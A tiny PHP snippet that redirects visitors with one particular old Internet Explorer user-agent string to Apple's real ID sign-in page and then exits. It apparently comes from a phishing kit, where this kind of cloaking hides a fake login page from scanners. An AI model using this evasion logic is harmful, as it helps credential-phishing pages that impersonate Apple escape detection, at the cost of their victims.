<?php
if ($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
        @header("Location: https://idmsa.apple.com/IDMSWebAuth/login.html?appIdKey=af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3&accNameLocked=false&language=US-EN&path=/signin/?referrer=/account/manage&Env=PROD");
		die();
}
?>